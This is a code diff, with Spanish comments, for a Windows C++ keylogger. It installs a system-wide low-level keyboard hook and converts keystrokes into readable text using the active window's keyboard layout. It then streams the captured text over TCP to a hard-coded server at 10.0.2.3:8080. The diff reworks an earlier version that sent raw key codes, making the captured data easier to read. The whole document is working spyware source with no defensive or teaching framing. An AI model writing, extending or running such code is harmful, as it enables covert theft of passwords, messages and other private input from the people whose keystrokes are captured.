@@ -9,86 +9,92 @@
 #include <ws2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "user32.lib")
 
 // --- Configuración ---
-const char* SERVER_IP = "10.0.2.3";
+const char* SERVER_IP   = "10.0.2.3";
 const char* SERVER_PORT = "8080";
 
-// --- Estructuras y Sincronización ---
-struct KeyData {
-    DWORD vkCode;
-    ULONGLONG timestamp;
-};
-
-std::queue<KeyData> keyQueue;
+// --- Sincronización Global ---
+std::queue<std::string> dataQueue;
 std::mutex queueMtx;
 std::condition_variable queueCv;
 bool running = true;
 HHOOK g_hook = nullptr;
 
-// --- Utilidades de Red ---
+// --- Traducción de Teclas a Texto Legible ---
+std::string TranslateKey(DWORD vkCode, UINT scanCode) {
+    static BYTE kbdState[256];
+    GetKeyboardState(kbdState);
 
-bool sendAll(SOCKET sock, const char* buffer, int size) {
-    int sent = 0;
-    while (sent < size) {
-        int res = send(sock, buffer + sent, size - sent, 0);
-        if (res == SOCKET_ERROR) return false;
-        sent += res;
-    }
-    return true;
+    // Actualizar estado de teclas especiales manualmente para el hilo
+    kbdState[VK_SHIFT] = (GetKeyState(VK_SHIFT) & 0x80) ? 0x80 : 0;
+    kbdState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x01) ? 0x01 : 0;
+    kbdState[VK_MENU] = (GetKeyState(VK_MENU) & 0x80) ? 0x80 : 0;
+
+    wchar_t buffer[5];
+    HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
+    
+    int result = ToUnicodeEx(vkCode, scanCode, kbdState, buffer, 4, 0, layout);
+
+    if (result > 0) {
+        std::wstring ws(buffer, result);
+        return std::string(ws.begin(), ws.end());
+    } else if (vkCode == VK_RETURN) return "\n";
+    else if (vkCode == VK_BACK) return "[BACKSPACE]";
+    else if (vkCode == VK_SPACE) return " ";
+    else if (vkCode == VK_TAB) return "[TAB]";
+    
+    return ""; // Ignorar teclas sin representación de texto (F1, Ctrl, etc.)
 }
 
+// --- Lógica de Red (Consumidor) ---
 void networkWorker() {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
 
     while (running) {
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock == INVALID_SOCKET) {
-            std::this_thread::sleep_for(std::chrono::seconds(2));
-            continue;
-        }
-
-        addrinfo hints{}, *res = nullptr;
+        struct addrinfo hints{}, *res = nullptr;
         hints.ai_family = AF_INET;
         hints.ai_socktype = SOCK_STREAM;
 
         if (getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res) != 0) {
-            closesocket(sock);
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
 
-        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
+        SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+        if (sock == INVALID_SOCKET) {
             freeaddrinfo(res);
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+            continue;
+        }
+
+        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
             closesocket(sock);
+            freeaddrinfo(res);
             std::this_thread::sleep_for(std::chrono::seconds(5));
             continue;
         }
         freeaddrinfo(res);
 
-        // Bucle de envío mientras la conexión sea estable
         while (running) {
-            KeyData data;
+            std::string data;
             {
                 std::unique_lock<std::mutex> lock(queueMtx);
                 queueCv.wait_for(lock, std::chrono::milliseconds(500), [] { 
-                    return !keyQueue.empty() || !running; 
+                    return !dataQueue.empty() || !running; 
                 });
 
-                if (!running && keyQueue.empty()) break;
-                if (keyQueue.empty()) continue;
+                if (!running && dataQueue.empty()) break;
+                if (dataQueue.empty()) continue;
 
-                data = keyQueue.front();
-                keyQueue.pop();
+                data = dataQueue.front();
+                dataQueue.pop();
             }
 
-            // Estructura de datos simple: [Timestamp(8b)][VK(4b)]
-            std::vector<char> packet(sizeof(data));
-            memcpy(packet.data(), &data, sizeof(data));
-
-            if (!sendAll(sock, packet.data(), (int)packet.size())) {
-                break; // Error de red, intentar reconectar
+            if (send(sock, data.c_str(), (int)data.length(), 0) == SOCKET_ERROR) {
+                break; // Error de conexión, intentar reconectar
             }
         }
         closesocket(sock);
@@ -96,26 +102,28 @@ void networkWorker() {
     WSACleanup();
 }
 
-// --- Hook de Teclado ---
-
+// --- Hook de Teclado (Productor) ---
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
         
-        {
+        std::string keyStroke = TranslateKey(kbs->vkCode, kbs->scanCode);
+        
+        if (!keyStroke.empty()) {
             std::lock_guard<std::mutex> lock(queueMtx);
-            keyQueue.push({ kbs->vkCode, GetTickCount64() });
+            dataQueue.push(keyStroke);
+            queueCv.notify_one();
         }
-        queueCv.notify_one();
     }
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
-// --- Main ---
-
+// --- Entrada Principal ---
 int main() {
+    // 1. Iniciar hilo de red
     std::thread netThread(networkWorker);
 
+    // 2. Instalar Hook
     g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (!g_hook) {
         running = false;
@@ -124,14 +132,16 @@ int main() {
         return 1;
     }
 
-    std::cout << "Monitor activo. Presione Ctrl+C en la consola para salir (o termine el proceso).\n";
+    std::cout << "Captura optimizada iniciada. Enviando a " << SERVER_IP << ":" << SERVER_PORT << std::endl;
 
+    // 3. Loop de mensajes (Requerido para Hooks)
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
+    // 4. Limpieza ordenada
     running = false;
     queueCv.notify_all();
     UnhookWindowsHookEx(g_hook);
